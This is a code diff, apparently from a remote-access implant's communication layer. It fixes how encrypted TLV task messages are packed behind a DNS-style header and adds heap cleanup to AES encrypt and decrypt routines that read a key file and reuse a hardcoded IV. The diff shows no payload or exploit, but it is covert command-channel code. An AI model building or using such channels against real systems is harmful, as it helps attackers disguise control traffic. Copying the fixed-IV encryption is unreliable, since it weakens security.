@@ -83,9 +83,9 @@ BOOL SendTlvMessage(SOCKET sock, USHORT taskId, DWORD type, DWORD payloadLength,
 
 	ASSERT(sock != INVALID_SOCKET);
 
-	memcpy(msg + TLV_TYPE_FIELD_OFFSET, &type, sizeof(DWORD));
-	memcpy(msg + TLV_LENGTH_FIELD_OFFSET, &payloadLength, sizeof(DWORD));
-	memcpy(msg + TLV_LENGTH_FIELD_OFFSET + sizeof(DWORD), payload, payloadLength);
+	memcpy(msg + DNS_HEADER_SIZE + TLV_TYPE_FIELD_OFFSET, &type, sizeof(DWORD));
+	memcpy(msg + DNS_HEADER_SIZE + TLV_LENGTH_FIELD_OFFSET, &payloadLength, sizeof(DWORD));
+	memcpy(msg + DNS_HEADER_SIZE + TLV_LENGTH_FIELD_OFFSET + sizeof(DWORD), payload, payloadLength);
 
 	EncodeDNS(msg, taskId, type, payloadLength, payload);
 
@@ -161,25 +161,24 @@ VOID FreeTlvMessage(TLV_MESSAGE* msg)
 BOOL EncodeDNS(PBYTE msg, USHORT taskId, DWORD type, DWORD payloadLength, PBYTE payload)
 {
 	USHORT dummyAnswer, dummyAuthority, dummyAdditional;
+	PBYTE msgTLV = msg + DNS_HEADER_SIZE;
+	DWORD msgTLVLength = payloadLength + TLV_HEADER_SIZE;
+	msgTLVLength += (AES_BLOCK_SIZE - (msgTLVLength % AES_BLOCK_SIZE));
 	dummyAnswer = 0;
 	dummyAuthority = 0;
 	dummyAdditional = 0;
-	*payloadLength = *payloadLength + (16 - (*payloadLength % 16));
+	
 
 	//memcpy(dest, src, size);
 	memcpy(msg, &taskId, sizeof(USHORT));
 	memcpy(msg + DNS_FLAGS_OFFSET, (USHORT*)&type, sizeof(USHORT));
-	memcpy(msg + DNS_LENGTH_OFFSET, (USHORT*)&payloadLength, sizeof(USHORT));
+	memcpy(msg + DNS_LENGTH_OFFSET, (USHORT*)&msgTLVLength, sizeof(USHORT));
 	memcpy(msg + DNS_ANSWER_OFFSET, &dummyAnswer, sizeof(USHORT));
 	memcpy(msg + DNS_AUTHORITY_OFFSET, &dummyAuthority, sizeof(USHORT));
 	memcpy(msg + DNS_ADDITIONAL_OFFSET, &dummyAdditional, sizeof(USHORT));
 
-	Encrypt(payload, payloadLength);
-
-	Encrypt(payload, length);
-	memcpy(msg + DNS_HEADER_SIZE, payload, payloadLength);
-
-	*payloadLength += DNS_HEADER_SIZE;
+	memcpy(msgTLV + TLV_HEADER_SIZE, payload, payloadLength);
+	Encrypt(msg + DNS_HEADER_SIZE, payloadLength);
 
 	return TRUE;
 }
@@ -205,13 +204,13 @@ BOOL Encrypt(PBYTE msg, DWORD msgLength) {
 	HANDLE keyFile = NULL;
 	BOOL ret = TRUE;
 	UCHAR ivInitial[IV_SIZE] = IV;
-	UCHAR ivBuff[IV_SIZE] = { 0 };
+	UCHAR* ivBuff = ImplantHeapAlloc(IV_SIZE);
 	memcpy(ivBuff, ivInitial, IV_SIZE);
 
 	if (status != STATUS_SUCCESS)
 	{
-		ImplantHeapFree(buff);
-		return FALSE;
+		ret = FALSE;
+		goto cleanup;
 	}
 
 	status = BCryptSetProperty(
@@ -222,8 +221,8 @@ BOOL Encrypt(PBYTE msg, DWORD msgLength) {
 		0);
 	if (status != STATUS_SUCCESS)
 	{
-		ImplantHeapFree(buff);
-		return FALSE;
+		ret = FALSE;
+		goto cleanup;
 	}
 
 	keyFile = CreateFileW(L"..\\key.bin", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
@@ -266,6 +265,9 @@ cleanup:
 	{
 		ImplantHeapFree(buff);
 	}
+	if (ivBuff != NULL) {
+		ImplantHeapFree(ivBuff);
+	}
 	if (keyFile != NULL)
 	{
 		CloseHandle(keyFile);
@@ -283,7 +285,7 @@ BOOL Decrypt(PBYTE msg, DWORD* msgLength) {
 	HANDLE keyFile = NULL;
 	BOOL ret = TRUE;
 	UCHAR ivInitial[IV_SIZE] = IV;
-	UCHAR ivBuff[IV_SIZE] = { 0 };
+	UCHAR* ivBuff = ImplantHeapAlloc(IV_SIZE);
 	memcpy(ivBuff, ivInitial, IV_SIZE);
 
 	if (status != STATUS_SUCCESS)
@@ -343,6 +345,10 @@ cleanup:
 	if (buff != NULL)
 	{
 		ImplantHeapFree(buff);
+	}
+	if (ivBuff != NULL)
+	{
+		ImplantHeapFree(ivBuff);
 	}
 	if (keyFile != NULL)
 	{
